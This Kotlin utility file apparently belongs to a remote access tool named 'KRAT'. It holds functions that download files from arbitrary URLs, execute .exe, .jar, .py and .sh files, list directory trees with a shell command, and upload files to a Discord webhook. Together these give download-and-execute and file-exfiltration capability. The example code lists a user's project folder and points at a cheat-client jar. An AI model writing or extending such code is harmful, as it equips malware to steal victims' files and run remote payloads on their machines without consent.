package utils

import services.Discord
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.net.URI
import java.nio.file.Files
import java.nio.file.Paths
import java.nio.file.StandardCopyOption

object FileUtils {

    /**
     * Downloads a file from the given URL to the specified destination.
     *
     * @param url The URL of the file to download.
     * @param destination The directory path where the file should be saved.
     * @throws Exception if there's an error during the download process.
     */
    fun download(url: String, destination: File) {
        try {
            val url = URI(url).toURL()
            val connection = url.openConnection()
            connection.connect()

            Files.copy(
                connection.getInputStream(),
                Paths.get(destination.absolutePath, url.file.substringAfterLast("/")),
                StandardCopyOption.REPLACE_EXISTING
            )
        } catch (e: Exception) {
            println("Error downloading file: ${e.message}")
            throw e
        }
    }

    /**
     * Runs the specified file.
     * Currently, supports .exe, .jar, .py, and .sh files.
     * @param path The path to the file to be run.
     * @throws Exception if there's an error while trying to run the file.
     */
    fun run(path: String) {
        val file = File(path)
        if (!file.exists()) {
            throw IllegalArgumentException("File does not exist: $path")
        }

        try {
            val process = when {
                file.name.endsWith(".exe") -> ProcessBuilder(file.absolutePath)
                file.name.endsWith(".jar") -> ProcessBuilder("java", "-jar", file.absolutePath)
                file.name.endsWith(".py") -> ProcessBuilder("python", file.absolutePath)
                file.name.endsWith(".sh") -> ProcessBuilder("bash", file.absolutePath)
                else -> throw UnsupportedOperationException("Unsupported file type: ${file.extension}")
            }

            process.inheritIO().start().waitFor()
            println("File executed successfully: $path")
        } catch (e: Exception) {
            println("Error running file: ${e.message}")
            throw e
        }
    }

    /**
     * Creates a file tree string from the specified path.
     *
     * @param path The path to the directory to create the tree from.
     * @return The file tree string.
     * @throws IllegalArgumentException if the specified path does not exist.
     */
    fun fileTree(path: String): String {
        val tree = mutableListOf<String>()
        val file = File(path)
        if (!file.exists()) {
            throw IllegalArgumentException("File does not exist: $path")
        }

        return try {
            val process = ProcessBuilder("cmd", "/c", "tree", "/F", file.path).start()
            val reader = BufferedReader(InputStreamReader(process.inputStream))

            reader.lines().forEach { line ->
                tree.add(line)
            }

            process.waitFor()
            tree.joinToString("\n")
        } catch (e: Exception) {
            println("Error running file: ${e.message}")
            throw e
        }
    }


    /**
     * Sends the specified file as an attachment through the Discord webhook.
     *
     * @param file The file to be sent as an attachment.
     */
    fun send(file: File) {
        Discord.webhook().apply {
            attachments.add(file)
            execute()
        }
    }
}

// Example usage
fun main() {
    // Download example
//    FileUtils.download("https://github.com/xia-mc/Raven-XD/releases/download/v2.7.0/raven-XD.jar", KRAT.cacheDir)

//     Run example
//    FileUtils.run("C:\\Downloads\\file.exe")
    println(FileUtils.fileTree("C:\\Users\\drsna\\IdeaProjects"))
}